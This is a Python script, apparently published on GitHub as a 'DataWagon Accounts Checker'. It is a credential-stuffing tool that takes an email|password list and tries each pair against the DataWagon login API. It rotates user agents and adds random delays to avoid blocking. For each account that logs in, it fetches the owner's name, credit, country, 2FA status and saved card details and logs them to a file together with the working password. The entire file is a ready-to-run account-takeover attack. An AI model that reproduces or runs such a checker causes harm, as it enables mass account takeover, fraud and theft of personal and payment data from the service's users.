import requests
import json
import random
import time
from fake_useragent import UserAgent
from colorama import init, Fore

init(autoreset=True)

def login_and_check_cards(email, password):
    url = 'https://beta.api.datawagon.com/api/login'
    ua = UserAgent()
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://beta.cloud.datawagon.com',
        'Referer': 'https://beta.cloud.datawagon.com/',
        'User-Agent': ua.random
    }
    data = {
        "loading": False,
        "email": email,
        "password2": password,
        "errors": {}
    }

    response = requests.post(url, headers=headers, json=data)

    if 'result":"success' in response.text:
        json_data = response.json()
        user = json_data['user']
        userid = user['userid']
        firstname = user['firstname']
        lastname = user['lastname']
        credit = user['credit']
        currency = user['currency_code']
        country = user['country']
        twofa_enabled = user['twofaenabled']
        status = user['status']
        token = json_data['token']
        
        getcard = 'https://beta.api.datawagon.com/api/billing/card'
        getcardheaders = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://beta.cloud.datawagon.com',
            'Referer': 'https://beta.cloud.datawagon.com/',
            'Authorization': 'Bearer ' + token,
            'User-Agent': ua.random
        }
        getcarddata = requests.get(getcard, headers=getcardheaders)
        cards = getcarddata.json().get('paymethods', [])  

        with open('validaccs.txt', 'a') as valid_file:
            valid_file.write(f'Email: {email}\n')
            valid_file.write(f'Password: {password}\n')
            valid_file.write(f'UserID: {userid} | Firstname: {firstname} | Lastname: {lastname}\n')
            valid_file.write(f'Account Credit: {credit} {currency} | Country: {country} | 2FA Enabled: {twofa_enabled} | Account Status: {status}\n')
            if cards:
                for index, card in enumerate(cards, start=1):
                    cardid = card['card_last_four']
                    expiry = card['expiry_date']
                    cardtype = card['card_type']
                    valid_file.write(f'Card {index}: [ Card ID: {cardid} | Expiry: {expiry} | Card Type: {cardtype} ]\n')
            else:
                valid_file.write("NO PAYMENT METHOD\n")
            valid_file.write('\n') 
        print(f'[ {Fore.GREEN}ACCOUNT VALID - {email}|{password}{Fore.RESET} | {Fore.YELLOW}UserID: {userid} - Firstname: {firstname} - Lastname: {lastname} - Account Credit: {credit} {currency} - Country: {country} - 2FA Enabled: {Fore.GREEN if twofa_enabled else Fore.RED}{twofa_enabled}{Fore.RESET}{Fore.YELLOW} - Account Status: {Fore.GREEN if status == "Active" else Fore.RED}{status}{Fore.RESET} ]')
        
    elif 'auth":"We' in response.text:
        with open('invalidaccs.txt', 'a') as invalid_file:
            invalid_file.write(f'Invalid Account: {email}\n\n')
        print(f'[{Fore.RED} ACCOUNT INVALID - {email}|{password} {Fore.RESET}]')
        
    else:
        print(f'[{Fore.RED} ERROR - YOUR IP BLOCKED OR HOST DOWN {Fore.RESET}]')
        
    time.sleep(random.uniform(1, 5))

def main():
    banner = """
·▄▄▄▄   ▄▄▄· ▄▄▄▄▄ ▄▄▄· ▄▄▌ ▐ ▄▌ ▄▄▄·  ▄▄ •        ▐ ▄ 
██▪ ██ ▐█ ▀█ •██  ▐█ ▀█ ██· █▌▐█▐█ ▀█ ▐█ ▀ ▪▪     •█▌▐█
▐█· ▐█▌▄█▀▀█  ▐█.▪▄█▀▀█ ██▪▐█▐▐▌▄█▀▀█ ▄█ ▀█▄ ▄█▀▄ ▐█▐▐▌
██. ██ ▐█ ▪▐▌ ▐█▌·▐█ ▪▐▌▐█▌██▐█▌▐█ ▪▐▌▐█▄▪▐█▐█▌.▐▌██▐█▌
▀▀▀▀▀•  ▀  ▀  ▀▀▀  ▀  ▀  ▀▀▀▀ ▀▪ ▀  ▀ ·▀▀▀▀  ▀█▄▀▪▀▀ █▪
    """
    print(Fore.CYAN + banner + Fore.RESET)
    print(Fore.YELLOW + "Github.com/im-hanzou | DataWagon Accounts Checker\n" + Fore.RESET)
    filename = input(Fore.MAGENTA + "Your credentials file (" + Fore.RED +"format: email|password" + Fore.MAGENTA + "): " + Fore.RESET)
    with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            parts = line.strip().split('|')
            if len(parts) < 2:
                print(f"{Fore.RED}[ Invalid format in line: {line.strip()} ]{Fore.RESET}")
                continue
            email = parts[0]
            password = '|'.join(parts[1:])
            login_and_check_cards(email, password)

if __name__ == "__main__":
    main()
